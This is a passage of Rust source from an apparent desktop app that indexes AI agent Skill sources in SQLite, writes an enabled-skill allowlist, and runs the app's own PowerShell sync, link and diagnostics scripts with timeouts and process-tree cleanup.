    merge_managed_link_skills(&root, &mut diagnostic_skills);
    let configured_sources = parse_configured_sources(config_json.as_ref());
    let mut sources = scan_sources(&sources_dir, &configured_sources);
    hydrate_source_urls_from_git(&root, &mut sources);
    let mut skills = scan_skills(
        &skills_dir,
        &sources_dir,
        &diagnostic_skills,
        &configured_sources,
    );
    skills.extend(scan_source_tree_skills(
        &sources_dir,
        &sources,
        &configured_sources,
        &skills,
    ));
    demote_single_source_root_skills(&mut skills);
    // Generated conflict dispatchers and short aliases are routing infrastructure, not
    // user-installed local Skills. Keep only the one parent router that maps to a real source.
    retain_user_visible_skills(&mut skills, &sources);
    let agents = parse_agents(diagnostics_json.as_ref());
    let agent_adapters = derive_agent_adapters(&agents);
    let agent_doctors = derive_agent_doctors(diagnostics_json.as_ref(), &agent_adapters);
    let adapter_safety_checks = derive_adapter_safety_checks(&agent_adapters);
    let adapter_capabilities = derive_adapter_capabilities(&agent_adapters);
    let diagnostics = parse_diagnostic_summary(diagnostics_json.as_ref());

    let mut source_counts: HashMap<String, usize> = HashMap::new();
    for skill in &skills {
        *source_counts
            .entry(skill.source.to_lowercase())
            .or_insert(0) += 1;
    }
    for source in &mut sources {
        source.skill_count = *source_counts.get(&source.name.to_lowercase()).unwrap_or(&0);
    }

    skills.sort_by_key(|skill| skill.name.to_lowercase());
    sources.sort_by_key(|source| source.name.to_lowercase());

    let prompts = sources
        .iter()
        .filter(|source| source.source_type.eq_ignore_ascii_case("prompt"))
        .count();
    let warnings = skills.iter().filter(|skill| skill.health != "ok").count();
    let agents_detected = agents.iter().filter(|agent| agent.detected).count();
    let release_reports = derive_release_reports(&root);
    let import_previews = derive_import_previews(&sources_dir, &sources, &release_reports);
    let skill_conflicts = derive_skill_conflicts(&skills, &HashMap::new());

    let mut snapshot = LegacySnapshot {
        root: root.display().to_string(),
        skills_dir: skills_dir.display().to_string(),
        sources_dir: sources_dir.display().to_string(),
        diagnostics_file: diagnostics_file.display().to_string(),
        mode: "read-only".to_string(),
        summary: LegacySummary {
            skills: skills.len(),
            sources: sources.len(),
            prompts,
            agents_detected,
            warnings,
            diagnostics_status: diagnostics.overall_status.clone(),
        },
        skills,
        sources,
        agents,
        agent_skill_statuses: Vec::new(),
        agent_adapters,
        agent_doctors,
        adapter_safety_checks,
        adapter_capabilities,
        workspaces: Vec::new(),
        project_scans: Vec::new(),
        presets: Vec::new(),
        snapshots: Vec::new(),
        backup_targets: Vec::new(),
        backup_dry_run: Vec::new(),
        restore_dry_run: Vec::new(),
        rollback_plan: Vec::new(),
        release_reports,
        import_previews,
        source_popularity: Vec::new(),
        source_governance: Vec::new(),
        source_quality_signals: Vec::new(),
        last_sync_summary: SyncSummaryCard::default(),
        skill_conflicts,
        operator_consent: OperatorConsentCard {
            real_writes_enabled: false,
            enabled_at: String::new(),
            updated_at: String::new(),
            summary: "真实写入授权未开启；当前只允许 dry-run、报告和 SQLite 元数据。".to_string(),
        },
        tags: Vec::new(),
        skill_folders: Vec::new(),
        preset_distributions: Vec::new(),
        operation_runners: Vec::new(),
        write_gates: Vec::new(),
        desktop_qa_checks: Vec::new(),
        usage_stats: Vec::new(),
        audit_events: Vec::new(),
        diagnostics,
        index: IndexReport {
            persisted: false,
            database_file: database_file(&root).display().to_string(),
            indexed_at: String::new(),
            sources_indexed: 0,
            skills_indexed: 0,
            agents_indexed: 0,
            snapshot_id: String::new(),
        },
    };

    snapshot.workspaces = derive_workspaces(&root, &snapshot.agents, snapshot.skills.len());
    snapshot.project_scans = derive_project_scans(&root, &snapshot.workspaces);
    snapshot.presets = derive_presets(&snapshot.skills);
    if let Ok(connection) = open_index_database(&root) {
        let enabled_state = load_enabled_state(&connection);
        apply_enabled_state(&mut snapshot, &enabled_state);
    }
    snapshot.agent_skill_statuses =
        derive_agent_skill_statuses(&root, &snapshot.skills, &snapshot.agents);
    snapshot.backup_targets = derive_backup_targets(&root, &snapshot.agent_adapters);
    snapshot.backup_dry_run = derive_backup_dry_run(&snapshot.backup_targets);
    snapshot.restore_dry_run = derive_restore_dry_run(&snapshot.backup_targets);
    snapshot.index = persist_snapshot(&root, &snapshot)?;
    if let Some((migration_config, source_recovery)) = pending_migration {
        // A final manifest is a durable promise that no recovery work remains.
        // Keep incomplete staging resumable instead of marking a partial copy as
        // complete or merging metadata against a partial identity set.
        let recovery_complete =
            source_recovery.summary.failed == 0 && source_recovery.summary.repair_needed == 0;
        if recovery_complete {
            let metadata_merge = migration_v4::merge_legacy_metadata_v4(&migration_config)
                .map_err(|error| format!("Cannot merge legacy v4 metadata: {error}"))?;
            migration_v4::finalize_migration_v4_report(
                &migration_config,
                source_recovery,
                metadata_merge,
            )
            .map_err(|error| format!("Cannot finalize v4 migration report: {error}"))?;
        }
    }
    if let Ok(connection) = open_index_database(&root) {
        // Rehydrate through the override-aware queries before returning any scan
        // result. Automatic README/SKILL analysis is base metadata only; a sync or
        // manual rescan must never temporarily replace the user's local edits.
        if let Ok(effective_sources) = read_indexed_sources(&connection) {
            snapshot.sources = effective_sources;
        }
        if let Ok(effective_skills) = read_indexed_skills(&connection) {
            snapshot.skills = effective_skills;
        }
        snapshot.summary.skills = snapshot.skills.len();
        snapshot.summary.sources = snapshot.sources.len();
        snapshot.summary.prompts = snapshot
            .sources
            .iter()
            .filter(|source| source.source_type.eq_ignore_ascii_case("prompt"))
            .count();
        snapshot.summary.warnings = snapshot
            .skills
            .iter()
            .filter(|skill| skill.health != "ok")
            .count();
        snapshot.skill_conflicts = derive_skill_conflicts(
            &snapshot.skills,
            &read_skill_conflict_choice_state(&connection).unwrap_or_default(),
        );
        snapshot.agent_skill_statuses =
            derive_agent_skill_statuses(&root, &snapshot.skills, &snapshot.agents);
        snapshot.snapshots = read_indexed_snapshots(&connection).unwrap_or_default();
        snapshot.backup_targets = read_indexed_backup_targets(&connection).unwrap_or_default();
        snapshot.backup_dry_run = read_indexed_backup_dry_run(&connection).unwrap_or_default();
        snapshot.restore_dry_run = read_indexed_restore_dry_run(&connection).unwrap_or_default();
        snapshot.rollback_plan = read_indexed_rollback_plan(&connection).unwrap_or_default();
        snapshot.desktop_qa_checks =
            read_indexed_desktop_qa_checks(&connection).unwrap_or_default();
        snapshot.usage_stats = read_indexed_usage_stats(&connection).unwrap_or_default();
        snapshot.source_popularity =
            read_indexed_source_popularity(&connection, &snapshot.sources, &snapshot.usage_stats)
                .unwrap_or_default();
        snapshot.source_governance =
            source_governance::read_governance_cards(&root, &connection, &snapshot.sources)
                .unwrap_or_default();
        snapshot.source_quality_signals =
            source_governance::read_quality_signals(&connection, &snapshot.sources)
                .unwrap_or_default();
        snapshot.operator_consent =
            read_operator_consent(&connection).unwrap_or(snapshot.operator_consent);
        snapshot.tags = read_indexed_tags(&connection).unwrap_or_default();
        snapshot.skill_folders = read_indexed_skill_folders(&connection).unwrap_or_default();
        snapshot.preset_distributions =
            read_indexed_preset_distributions(&connection).unwrap_or_default();
        snapshot.operation_runners =
            read_indexed_operation_runners(&connection, &root).unwrap_or_default();
        snapshot.audit_events = read_indexed_audit_events(&connection).unwrap_or_default();
    }
    snapshot.write_gates = derive_write_gates(
        &snapshot.diagnostics,
        &snapshot.release_reports,
        &snapshot.import_previews,
        &snapshot.backup_dry_run,
        &snapshot.restore_dry_run,
        &snapshot.rollback_plan,
        &snapshot.desktop_qa_checks,
        &snapshot.agent_adapters,
        &snapshot.operation_runners,
        &snapshot.operator_consent,
    );
    Ok(snapshot)
}

fn load_indexed_snapshot_blocking() -> Result<LegacySnapshot, String> {
    let root = resolve_legacy_root()?;
    if migration_v4_is_pending(&root) {
        return scan_legacy_snapshot_blocking();
    }
    let db_file = database_file(&root);

    if !db_file.exists() {
        return scan_legacy_snapshot_blocking();
    }

    let connection = open_index_database(&root)?;
    let snapshot = read_snapshot_from_database(&root, &connection)
        .or_else(|_| scan_legacy_snapshot_blocking())?;

    if indexed_snapshot_needs_portable_source_refresh(&root, &snapshot) {
        return scan_legacy_snapshot_blocking();
    }

    if !snapshot.skills.is_empty()
        && (snapshot.workspaces.is_empty()
            || snapshot.presets.is_empty()
            || snapshot.agent_adapters.is_empty()
            || snapshot.adapter_capabilities.is_empty()
            || snapshot.project_scans.is_empty()
            || snapshot.backup_targets.is_empty()
            || snapshot.backup_dry_run.is_empty()
            || snapshot.restore_dry_run.is_empty()
            || snapshot.rollback_plan.is_empty()
            || snapshot.desktop_qa_checks.is_empty())
    {
        return scan_legacy_snapshot_blocking();
    }

    Ok(snapshot)
}

fn indexed_snapshot_needs_portable_source_refresh(root: &Path, snapshot: &LegacySnapshot) -> bool {
    let current_sources_dir = managed_sources_dir(root);

    snapshot.sources.iter().any(|source| {
        if source.name.eq_ignore_ascii_case(ROUTER_HUB_FOLDER) {
            return false;
        }

        let stored_path = PathBuf::from(source.local_path.trim());
        let relocated_path = stored_path
            .file_name()
            .filter(|name| !name.is_empty())
            .map(|name| current_sources_dir.join(name));
        let stored_path_is_current =
            stored_path.exists() && stored_path.starts_with(&current_sources_dir);
        let portable_path = if stored_path_is_current {
            stored_path.clone()
        } else if let Some(candidate) = relocated_path.filter(|candidate| candidate.exists()) {
            candidate
        } else if let Some((_owner, repo)) = parse_github_repo(&source.url) {
            current_sources_dir.join(repo)
        } else {
            current_sources_dir.join(sanitize_source_folder_name(&source.name))
        };

        if portable_path.exists() && !stored_path_is_current {
            return true;
        }

        source.skill_count == 0
            && !source.source_type.eq_ignore_ascii_case("prompt")
            && portable_path.exists()
            && has_skill_md_descendant(&portable_path)
    })
}

fn run_skillhub_sync_blocking() -> Result<LegacySnapshot, String> {
    let root = resolve_legacy_root()?;
    let connection = open_index_database(&root)?;

    // Capture a verified revision ref before update and write the pin manifest
    // consumed by SkillHub.ps1. A pinned source is kept at its exact commit.
    source_governance::prepare_sync_backups(&root, &connection)?;
    run_skillhub_script(&root)?;
    source_governance::refresh_local_revisions(&root, &connection)?;
    // A repository update can add/remove children, so regenerate parent routers
    // before the final no-pull publish. The second PowerShell pass atomically
    // reconciles the active catalog with the regenerated router tree and removes
    // broken managed links left by older versions.
    // A source is callable only after its parent router exists. Do not publish a
    // partially regenerated catalog when router creation fails: keep the current
    // active links intact and surface the bounded error to the user instead.
    let report = plan_or_write_router_hubs(&root, true, true)?;
    let _ = record_router_hub_audit(&connection, &report);
    let _ = sync_skill_conflict_dispatchers(&root, &connection);
    run_skillhub_script_no_pull(&root)?;
    run_agent_link_script(&root)?;
    run_diagnostics_export_script(&root)?;
    scan_legacy_snapshot_blocking()
}

fn ensure_agent_skill_delivery_blocking() -> Result<LegacySnapshot, String> {
    let root = resolve_legacy_root()?;
    if !database_file(&root).exists() {
        let _ = scan_legacy_snapshot_blocking()?;
    }
    let connection = open_index_database(&root)?;
    let snapshot = read_snapshot_from_database(&root, &connection)?;
    if snapshot.skills.is_empty() {
        return Ok(snapshot);
    }
    sync_local_sources_to_agents(&root, &connection)?;
    scan_legacy_snapshot_blocking()
}

fn set_source_version_pin_blocking(
    source_id: String,
    pinned: bool,
) -> Result<LegacySnapshot, String> {
    let root = resolve_legacy_root()?;
    if !database_file(&root).exists() {
        let _ = scan_legacy_snapshot_blocking()?;
    }
    let connection = open_index_database(&root)?;
    source_governance::set_pin(&root, &connection, &source_id, pinned)?;
    read_snapshot_from_database(&root, &connection)
}

fn refresh_source_version_status_blocking(source_id: String) -> Result<LegacySnapshot, String> {
    let root = resolve_legacy_root()?;
    if !database_file(&root).exists() {
        let _ = scan_legacy_snapshot_blocking()?;
    }
    let connection = open_index_database(&root)?;
    source_governance::refresh_status(&root, &connection, &source_id)?;
    read_snapshot_from_database(&root, &connection)
}

fn rollback_source_to_latest_backup_blocking(source_id: String) -> Result<LegacySnapshot, String> {
    let root = resolve_legacy_root()?;
    if !database_file(&root).exists() {
        let _ = scan_legacy_snapshot_blocking()?;
    }
    let connection = open_index_database(&root)?;
    source_governance::rollback_latest(&root, &connection, &source_id)?;
    // The repository tree changed atomically; rebuild the index so the library
    // and generated parent/child routes reflect the restored commit.
    scan_legacy_snapshot_blocking()
}

fn refresh_agent_detection_blocking() -> Result<LegacySnapshot, String> {
    let root = resolve_legacy_root()?;

    if !database_file(&root).exists() {
        return scan_legacy_snapshot_blocking();
    }

    run_diagnostics_export_script(&root)?;

    let diagnostics_json = read_json(&diagnostics_file(&root));
    let mut connection = open_index_database(&root)?;
    persist_agent_detection_refresh(&root, &mut connection, diagnostics_json.as_ref())?;
    read_snapshot_from_database(&root, &connection)
}

fn sync_local_sources_to_agents(root: &Path, connection: &Connection) -> Result<(), String> {
    // Build every generated parent first, then publish one coherent active
    // catalog. Publishing before router generation can leave stale junctions
    // pointing at a router directory that was removed and recreated.
    let report = plan_or_write_router_hubs(root, true, true)?;
    let _ = record_router_hub_audit(connection, &report);
    sync_skill_conflict_dispatchers(root, connection)?;
    run_skillhub_script_no_pull(root)?;
    run_agent_link_script(root)?;
    run_diagnostics_export_script(root)
}

fn run_skillhub_script(root: &Path) -> Result<(), String> {
    run_skillhub_script_with_options(root, false)
}

fn run_skillhub_script_no_pull(root: &Path) -> Result<(), String> {
    run_skillhub_script_with_options(root, true)
}

fn run_skillhub_script_with_options(root: &Path, no_pull: bool) -> Result<(), String> {
    let script = skillhub_script_file(root);
    if !script.exists() {
        return Err(format!("找不到同步脚本：{}", script.display()));
    }

    let mut command = Command::new("powershell.exe");
    command
        .args(["-NoProfile", "-ExecutionPolicy", "Bypass", "-File"])
        .arg(&script);
    configure_user_data_command(&mut command, root);
    if no_pull {
        command.arg("-NoPull");
    }
    let output = command_output_with_timeout(
        &mut command,
        Duration::from_secs(240),
        "SkillHub 同步超过 240 秒，已自动停止。请检查 GitHub 网络、卡住的仓库，或先手动刷新来源。",
    )?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        let detail = stderr
            .lines()
            .rev()
            .find(|line| !line.trim().is_empty())
            .unwrap_or("同步脚本异常退出")
            .trim();
        let detail = detail.chars().take(280).collect::<String>();
        return Err(format!(
            "同步未完成，但本地来源和未提交内容均未删除。请打开“维护工具 → 导出排错包”查看详情。技术摘要：{detail}"
        ));
    }

    Ok(())
}

fn run_agent_link_script(root: &Path) -> Result<(), String> {
    let script = agent_link_script_file(root);
    if !script.exists() {
        return Err(format!("找不到 AI 工具链接脚本：{}", script.display()));
    }

    let mut command = Command::new("powershell.exe");
    command
        .args(["-NoProfile", "-ExecutionPolicy", "Bypass", "-File"])
        .arg(&script)
        .arg("-Quiet");
    configure_user_data_command(&mut command, root);
    if database_file(root).exists() {
        let allowlist = write_agent_skill_allowlist(root)?;
        command.env("AI_SKILLHUB_AGENT_SKILL_ALLOWLIST", allowlist);
    }
    let output = command_output_with_timeout(
        &mut command,
        Duration::from_secs(180),
        "AI 工具链接同步超过 180 秒，已自动停止。请检查 Codex/Claude/Antigravity skills 目录权限。",
    )?;

    if !output.status.success() {
        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);
        let detail = [stdout.trim(), stderr.trim()]
            .into_iter()
            .filter(|part| !part.is_empty())
            .collect::<Vec<_>>()
            .join("\n");
        let detail = if detail.chars().count() > 1600 {
            detail.chars().take(1600).collect::<String>()
        } else {
            detail
        };
        return Err(format!("AI 工具链接同步失败：{detail}"));
    }

    Ok(())
}

#[derive(Clone, Debug)]
struct AgentSkillAllowlistRule {
    folder_name: String,
    source_name: String,
    source_local_path: String,
    enabled: bool,
}

#[derive(Clone, Debug, PartialEq, Eq)]
enum GeneratedAgentSkillDependency {
    Skill { source: String, skill: String },
    Source(String),
}

#[derive(Clone, Debug)]
struct ActiveAgentSkillEntry {
    name: String,
    dependency: Option<GeneratedAgentSkillDependency>,
}

fn markdown_code_value(line: &str, prefixes: &[&str]) -> Option<String> {
    let line = line.trim();
    prefixes.iter().find_map(|prefix| {
        line.strip_prefix(prefix).and_then(|value| {
            let value = value
                .trim()
                .trim_matches('`')
                .trim_start_matches('$')
                .trim()
                .to_string();
            (!value.is_empty()).then_some(value)
        })
    })
}

fn generated_agent_skill_dependency(raw: &str) -> Option<GeneratedAgentSkillDependency> {
    if raw.contains(CONFLICT_DISPATCHER_MARKER) {
        let source = raw
            .lines()
            .find_map(|line| markdown_code_value(line, &["- Source:"]))?;
        let skill = raw
            .lines()
            .find_map(|line| markdown_code_value(line, &["- Skill:", "- Skill name:"]))?;
        return Some(GeneratedAgentSkillDependency::Skill { source, skill });
    }

    if raw.contains(ROUTER_HUB_MARKER) {
        if let Some(source) = raw
            .lines()
            .find_map(|line| markdown_code_value(line, &["- Managed source:", "- 管理来源："]))
        {
            return Some(GeneratedAgentSkillDependency::Source(source));
        }
        const PREFIX: &str = "generated parent router for the local ";
        const SUFFIX: &str = " skill collection.";
        let start = raw.find(PREFIX)? + PREFIX.len();
        let tail = &raw[start..];
        let end = tail.find(SUFFIX)?;
        let source = tail[..end].trim();
        if !source.is_empty() {
            return Some(GeneratedAgentSkillDependency::Source(source.to_string()));
        }
    }

    None
}

fn agent_skill_source_keys(rule: &AgentSkillAllowlistRule) -> Vec<String> {
    let mut keys = vec![normalize_skill_lookup(&rule.source_name)];
    if let Some(folder_name) = Path::new(&rule.source_local_path)
        .file_name()
        .and_then(|value| value.to_str())
    {
        keys.push(normalize_skill_lookup(folder_name));
    }
    keys.retain(|key| !key.is_empty());
    keys.sort();
    keys.dedup();
    keys
}

fn collect_active_agent_skill_entries(
    active_skills_root: &Path,
) -> Result<Vec<ActiveAgentSkillEntry>, String> {
    let entries = fs::read_dir(active_skills_root).map_err(|error| {
        format!(
            "Cannot read final active Skill view {}: {}",
            active_skills_root.display(),
            error
        )
    })?;
    let mut active_entries = Vec::new();

    for entry in entries.flatten() {
        let path = entry.path();
        let manifest = path.join("SKILL.md");
        if !manifest.is_file() {
            continue;
        }
        let raw = fs::read_to_string(&manifest).unwrap_or_default();
        active_entries.push(ActiveAgentSkillEntry {
            name: entry.file_name().to_string_lossy().to_string(),
            dependency: generated_agent_skill_dependency(&raw),
        });
    }

    active_entries.sort_by_key(|entry| entry.name.to_lowercase());
    Ok(active_entries)
}

fn active_agent_entry_names_for_skill(
    skill: &SkillCard,
    active_entries: &[ActiveAgentSkillEntry],
) -> Vec<String> {
    let direct_name = skill.folder_name.to_lowercase();
    let identity = source_skill_identity_key(&skill.source, &skill.name);
    let source_key = normalize_skill_lookup(&skill.source);
    let mut names = active_entries
        .iter()
        .filter_map(|entry| {
            let matches = match &entry.dependency {
                Some(GeneratedAgentSkillDependency::Skill { source, skill }) => {
                    source_skill_identity_key(source, skill) == identity
                }
                Some(GeneratedAgentSkillDependency::Source(source)) => {
                    normalize_skill_lookup(source) == source_key
                }
                None => entry.name.eq_ignore_ascii_case(&direct_name),
            };
            matches.then(|| entry.name.clone())
        })
        .collect::<Vec<_>>();
    names.sort_by_key(|name| {
        (
            !name.eq_ignore_ascii_case(&skill.folder_name),
            name.to_lowercase(),
        )
    });
    names.dedup_by(|left, right| left.eq_ignore_ascii_case(right));
    names
}

fn select_agent_skill_allowlist_entries(
    active_skills_root: &Path,
    rules: &[AgentSkillAllowlistRule],
) -> Result<Vec<String>, String> {
    let mut enabled_direct_sources: HashMap<String, Vec<String>> = HashMap::new();
    let mut sources_with_enabled_skills = HashSet::new();

    for rule in rules.iter().filter(|rule| rule.enabled) {
        let source_keys = agent_skill_source_keys(rule);
        enabled_direct_sources
            .entry(rule.folder_name.to_lowercase())
            .or_default()
            .extend(source_keys.iter().cloned());
        for source_key in agent_skill_source_keys(rule) {
            sources_with_enabled_skills.insert(source_key);
        }
    }

    let active_entries = collect_active_agent_skill_entries(active_skills_root)?;
    let parent_source_keys = active_entries
        .iter()
        .filter_map(|entry| match &entry.dependency {
            Some(GeneratedAgentSkillDependency::Source(source))
                if sources_with_enabled_skills.contains(&normalize_skill_lookup(source)) =>
            {
                Some(normalize_skill_lookup(source))
            }
            _ => None,
        })
        .collect::<HashSet<_>>();
    let mut enabled = Vec::new();

    for entry in active_entries {
        let is_enabled = match entry.dependency {
            // Same-name child aliases belonged to the old flat catalog. Parent
            // routers now own their children, so aliases stay internal and are
            // intentionally not published into Codex/Claude menus.
            Some(GeneratedAgentSkillDependency::Skill { .. }) => false,
            Some(GeneratedAgentSkillDependency::Source(source)) => {
                sources_with_enabled_skills.contains(&normalize_skill_lookup(&source))
            }
            None => enabled_direct_sources
                .get(&entry.name.to_lowercase())
                .is_some_and(|source_keys| {
                    // Keep truly standalone/local Skills visible. A Skill from a
                    // managed source is reached through that source's parent.
                    !source_keys
                        .iter()
                        .any(|source| parent_source_keys.contains(source))
                }),
        };
        if is_enabled {
            enabled.push(entry.name);
        }
    }

    enabled.sort_by_key(|name| name.to_lowercase());
    enabled.dedup_by(|left, right| left.eq_ignore_ascii_case(right));
    Ok(enabled)
}

fn write_agent_skill_allowlist(root: &Path) -> Result<PathBuf, String> {
    let connection = open_index_database(root)?;
    let mut statement = connection
        .prepare(
            "SELECT skills.folder_name,
                    COALESCE(sources.name, ''), COALESCE(sources.local_path, ''),
                    CASE
                      WHEN COALESCE(skill_overrides.enabled, skills.enabled, 1) = 1
                       AND COALESCE(source_overrides.enabled, sources.enabled, 1) = 1
                      THEN 1 ELSE 0
                    END
             FROM skills
             LEFT JOIN skill_overrides ON skill_overrides.skill_id = skills.id
             LEFT JOIN sources ON sources.id = skills.source_id
             LEFT JOIN source_overrides ON source_overrides.source_id = sources.id",
        )
        .map_err(|error| format!("Cannot prepare Agent Skill allowlist: {}", error))?;
    let rows = statement
        .query_map([], |row| {
            Ok(AgentSkillAllowlistRule {
                folder_name: row.get(0)?,
                source_name: row.get(1)?,
                source_local_path: row.get(2)?,
                enabled: row.get::<_, i64>(3)? != 0,
            })
        })
        .map_err(|error| format!("Cannot read Agent Skill allowlist: {}", error))?;
    let rules = collect_rows(rows, "Agent Skill allowlist")?;
    let enabled = select_agent_skill_allowlist_entries(&active_skills_dir(root), &rules)?;
    let path = private_state_dir(root).join("agent-skill-allowlist.json");
    let body = serde_json::to_string_pretty(&enabled)
        .map_err(|error| format!("Cannot serialize Agent Skill allowlist: {}", error))?;
    fs::write(&path, format!("{}\n", body)).map_err(|error| {
        format!(
            "Cannot write Agent Skill allowlist {}: {}",
            path.display(),
            error
        )
    })?;
    Ok(path)
}

fn run_diagnostics_export_script(root: &Path) -> Result<(), String> {
    let script = diagnostics_export_script_file(root);
    if !script.exists() {
        return Err(format!("找不到诊断脚本：{}", script.display()));
    }

    let mut command = Command::new("powershell.exe");
    command
        .args(["-NoProfile", "-ExecutionPolicy", "Bypass", "-File"])
        .arg(&script)
        .arg("-Quiet");
    configure_user_data_command(&mut command, root);
    let output = command_output_with_timeout(
        &mut command,
        Duration::from_secs(90),
        "AI 工具检测超过 90 秒，已自动停止。请检查本机 AI 工具命令是否卡住。",
    )?;

    if !output.status.success() {
        let stdout = String::from_utf8_lossy(&output.stdout);
        let stderr = String::from_utf8_lossy(&output.stderr);
        let detail = [stdout.trim(), stderr.trim()]
            .into_iter()
            .filter(|part| !part.is_empty())
            .collect::<Vec<_>>()
            .join("\n");
        let detail = if detail.chars().count() > 1600 {
            detail.chars().take(1600).collect::<String>()
        } else {
            detail
        };
        return Err(format!("AI 工具检测脚本执行失败：{detail}"));
    }

    Ok(())
}

fn configure_user_data_command(command: &mut Command, root: &Path) {
    command
        .env("AI_SKILLHUB_DATA_ROOT", user_data_root(root))
        .env("AI_SKILLHUB_CONFIG_PATH", skillhub_config_file(root))
        .env("AI_SKILLHUB_ACTIVE_SKILLS", active_skills_dir(root))
        .env("AI_SKILLHUB_SOURCES", managed_sources_dir(root))
        .env("AI_SKILLHUB_REPORTS", reports_dir(root))
        .env("AI_SKILLHUB_STATE", private_state_dir(root));
}

fn command_output_with_timeout(
    command: &mut Command,
    timeout: Duration,
    timeout_message: &str,
) -> Result<std::process::Output, String> {
    command_output_with_timeout_and_cancel(command, timeout, timeout_message, None)
}

fn command_output_with_timeout_and_cancel(
    command: &mut Command,
    timeout: Duration,
    timeout_message: &str,
    cancellation: Option<&AtomicBool>,
) -> Result<std::process::Output, String> {
    configure_background_command(command);
    command.stdout(Stdio::piped()).stderr(Stdio::piped());
    let mut child = command
        .spawn()
        .map_err(|error| format!("无法启动后台命令：{error}"))?;
    let stdout_reader = child.stdout.take().map(|mut stream| {
        thread::spawn(move || {
            let mut buffer = Vec::new();
            let _ = stream.read_to_end(&mut buffer);
            buffer
        })
    });
    let stderr_reader = child.stderr.take().map(|mut stream| {
        thread::spawn(move || {
            let mut buffer = Vec::new();
            let _ = stream.read_to_end(&mut buffer);
            buffer
        })
    });
    let started = Instant::now();

    let status = loop {
        match child.try_wait() {
            Ok(Some(status)) => break status,
            Ok(None) => {
                if cancellation
                    .map(|token| token.load(Ordering::SeqCst))
                    .unwrap_or(false)
                {
                    terminate_child_process_tree(&mut child);
                    let _ = join_output_reader(stdout_reader);
                    let _ = join_output_reader(stderr_reader);
                    return Err(SOURCE_IMPORT_CANCELLED_MESSAGE.to_string());
                }
                if started.elapsed() >= timeout {
                    terminate_child_process_tree(&mut child);
                    let _ = join_output_reader(stdout_reader);
                    let _ = join_output_reader(stderr_reader);
                    return Err(timeout_message.to_string());
                }
                thread::sleep(Duration::from_millis(250));
            }
            Err(error) => {
                terminate_child_process_tree(&mut child);
                let _ = join_output_reader(stdout_reader);
                let _ = join_output_reader(stderr_reader);
                return Err(format!("无法检查后台命令状态：{error}"));
            }
        }
    };

    let stdout = join_output_reader(stdout_reader);
    let stderr = join_output_reader(stderr_reader);
    Ok(std::process::Output {
        status,
        stdout,
        stderr,
    })
}

fn terminate_child_process_tree(child: &mut std::process::Child) {
    #[cfg(target_os = "windows")]
    {
        // `Child::kill` only terminates the direct process on Windows. Git may
        // spawn credential/network helpers, and command wrappers keep stdout or
        // stderr pipes open after their parent exits. Terminate the exact owned
        // PID tree so cancellation cannot leave the UI waiting on inherited pipes.
        let mut taskkill = Command::new("taskkill.exe");
        taskkill
            .args(["/PID", &child.id().to_string(), "/T", "/F"])
            .stdout(Stdio::null())
            .stderr(Stdio::null());
        configure_background_command(&mut taskkill);
        let _ = taskkill.status();
    }
    let _ = child.kill();
    let _ = child.wait();
}

fn join_output_reader(reader: Option<thread::JoinHandle<Vec<u8>>>) -> Vec<u8> {
    reader
        .and_then(|handle| handle.join().ok())
        .unwrap_or_default()
}

#[cfg(target_os = "windows")]
fn configure_background_command(command: &mut Command) {
    command.creation_flags(CREATE_NO_WINDOW);
}

#[cfg(not(target_os = "windows"))]
fn configure_background_command(_command: &mut Command) {}

#[tauri::command]
fn set_agent_adapter_enabled(id: String, enabled: bool) -> Result<LegacySnapshot, String> {
    set_enabled_state("agent_adapters", &id, enabled)?;
    load_indexed_snapshot_blocking()
}

#[tauri::command]
fn set_workspace_enabled(id: String, enabled: bool) -> Result<LegacySnapshot, String> {
    set_enabled_state("workspaces", &id, enabled)?;
    load_indexed_snapshot_blocking()
}

#[tauri::command]
fn set_preset_enabled(id: String, enabled: bool) -> Result<LegacySnapshot, String> {
    set_enabled_state("presets", &id, enabled)?;
    load_indexed_snapshot_blocking()
}

#[tauri::command]
fn set_desktop_qa_check_status(id: String, status: String) -> Result<LegacySnapshot, String> {
    set_desktop_qa_status(&id, &status)?;
    load_indexed_snapshot_blocking()
}

#[tauri::command]
fn set_skill_metadata(
    folder_name: String,
    name: String,
    category: String,
    description: String,
    note: String,
) -> Result<LegacySnapshot, String> {
    set_skill_metadata_override(&folder_name, &name, &category, &description, &note)?;
    load_indexed_snapshot_blocking()
}

#[tauri::command]
fn set_skill_enabled(folder_name: String, enabled: bool) -> Result<LegacySnapshot, String> {
    let root = resolve_legacy_root()?;
    let connection = open_index_database(&root)?;
    set_skill_enabled_override_in_connection(&connection, &folder_name, enabled)?;
    sync_local_sources_to_agents(&root, &connection)?;
    scan_legacy_snapshot_blocking()
}

#[tauri::command]
fn set_skill_rating(folder_name: String, rating: u8) -> Result<LegacySnapshot, String> {
    set_skill_rating_override(&folder_name, rating)?;
    load_indexed_snapshot_blocking()
}

#[tauri::command]
fn set_source_rating(source_id: String, rating: u8) -> Result<LegacySnapshot, String> {
    set_source_rating_override(&source_id, rating)?;
    load_indexed_snapshot_blocking()
}

const SKILL_FOLDER_COLORS: &[&str] = &[
    "cyan", "violet", "magenta", "amber", "emerald", "blue", "coral", "slate",
];

fn validate_skill_folder_fields(
    name: &str,
    note: &str,
    color: &str,
) -> Result<(String, String, String), String> {
    let name = compact_note(name);
    let note = note.trim().to_string();
    let color = color.trim().to_ascii_lowercase();
    if name.is_empty() {
        return Err("文件夹名称不能为空。".to_string());
    }
    if name.chars().count() > 48 {
        return Err("文件夹名称最多 48 个字符。".to_string());
    }
    if note.chars().count() > 500 {
        return Err("文件夹备注最多 500 个字符。".to_string());
    }
    if !SKILL_FOLDER_COLORS.contains(&color.as_str()) {
        return Err("不支持的文件夹颜色。".to_string());
    }
    Ok((name, note, color))
}

#[tauri::command]
fn create_skill_folder(
    name: String,
    note: String,
    color: String,
) -> Result<Vec<SkillFolderCard>, String> {
    let (name, note, color) = validate_skill_folder_fields(&name, &note, &color)?;
    let root = resolve_legacy_root()?;
    let connection = open_index_database(&root)?;
    let count: i64 = connection
        .query_row("SELECT COUNT(*) FROM skill_folders", [], |row| row.get(0))
        .map_err(|error| format!("Cannot count Skill folders: {}", error))?;
    if count >= 100 {
        return Err("最多可创建 100 个 Skill 文件夹。".to_string());
    }
    let timestamp = unix_timestamp_string();
    let id = format!("{}-{}", stable_id("skill-folder", &name), timestamp);
    let sort_order: i64 = connection
        .query_row(
            "SELECT COALESCE(MAX(sort_order), -10) + 10 FROM skill_folders",
            [],
            |row| row.get(0),
        )
        .unwrap_or(0);
    connection
        .execute(
